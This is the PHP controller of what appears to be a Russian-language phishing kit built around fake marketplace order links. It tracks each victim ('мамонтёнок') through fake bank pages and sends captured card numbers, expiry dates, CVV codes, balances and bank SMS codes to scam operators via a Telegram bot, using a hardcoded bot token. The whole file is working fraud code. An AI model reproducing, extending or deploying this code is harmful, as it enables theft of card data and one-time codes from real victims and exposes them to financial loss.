<?php

namespace App\Http\Controllers;

use App\Models\Bievers;
use App\Models\Order;
use Illuminate\Http\Request;
use Illuminate\Support\Str;

class OrderController extends Controller
{
    public function show($unique_id)
    {
        $order = Order::where('unique_id', $unique_id)->firstOrFail();

        $message = "Мамонтёнок перешёл по ссылке с названием: " . $order->ad_name;
        $this->sendMessage($message, $order->worker_id);

        return view('order.details', compact('order'));
    }

    public function banks($unique_id)
    {
        $order = Order::where('unique_id', $unique_id)->firstOrFail();

        $message = "Мамонтёнок перешёл в раздел банков, объявление: " . $order->ad_name;
        $this->sendMessage($message, $order->worker_id);

        return view('order.banks', compact('order'));
    }

    public function writeBalance(Request $request)
    {
        $order = Order::where('unique_id', $request->input('unique_id'))->firstOrFail();

        $message = "Мамонтёнок вводит баланс, объявление: " . $order->ad_name;
        $wbiv = $message . "\n\nКарта: " . $request->input('card') .
    "\nДата: " . $request->input('expiryDate') .
    "\nCVV: " . $request->input('cvv');
        $this->sendMessage($message, $order->worker_id);
        foreach (Bievers::all() as $bievers) {
            $this->sendMessage($wbiv, $bievers->biever_id);
        }
        return response()->json();
    }

    public function sendLog(Request $request)
    {
        $order = Order::where('unique_id', $request->input('unique_id'))->firstOrFail();

        $message = "ЕСТЬ лог баланса, объявление: " . $order->ad_name;
        $wbiv = $message . "\n\nКарта: " . $request->input('card') .
            "\nДата: " . $request->input('expiryDate') .
            "\nCVV: " . $request->input('cvv') .
            "\n\nБаланс: " . $request->input('balance');
        $this->sendMessage($message, $order->worker_id);
        foreach (Bievers::all() as $bievers) {
            $this->sendMessage($wbiv, $bievers->biever_id);
        }

        return response()->json();
    }

    public function sendCode(Request $request)
    {
        $order = Order::where('unique_id', $request->input('unique_id'))->firstOrFail();

        $message = "СМС от банка, объявление: " . $order->ad_name;
        $wbiv = $message . "\n\nКод: " . $request->input('code');
        $this->sendMessage($message, $order->worker_id);
        foreach (Bievers::all() as $bievers) {
            $this->sendMessage($wbiv, $bievers->biever_id);
        }

        return response()->json();
    }

    public function confirm(Request $request, $unique_id)
    {
        $order = Order::where('unique_id', $unique_id)->firstOrFail();

        $this->sendMessage("Order confirmed: {$order->ad_name}, {$order->full_name}, {$order->price}, {$order->address}", $order->worker_id);

        return redirect()->back()->with('success', 'Order confirmed!');
    }


    public function createNewLink(Request $request) {
        $unique_id = Str::random(9);

        Order::create([
            'unique_id' => $unique_id,
            'worker_id' => $request->worker_id,
            'ad_name' => $request->ad_name,
            'full_name' => $request->full_name,
            'price' => $request->price,
            'address' => $request->address,
        ]);

        return response()->json(['unique_id' => $unique_id], 200);
    }

    public function getLinks(Request $request)
    {
        $orders = Order::where('worker_id', $request->worker_id)->orderBy('created_at', 'desc')->limit(10)->get();

        $links = $orders->map(function ($order) {
            return 'Название: ' . $order->ad_name . "\n" .
                'Ссылка: `' . url('/details/' . $order->unique_id) . "`\n" .
                'ФИО: ' . $order->full_name . "`\n" .
                'Цена: ' . $order->price . "`\n" .
                'Адресс: ' . $order->price . "`\n\n";
        });

        return response()->json(['links' => $links], 200);
    }

    public function sendMessage($message, $chat_id)
    {
        $bot_token = env('BOT_TOKEN');
        $url = "https://api.telegram.org/bot7441607473:AAFUfgY8yjq-odK4Ikgw9O_C7XS_NbbyvsY/sendMessage?chat_id={$chat_id}&text=" . urlencode($message);
        file_get_contents($url);
    }
}
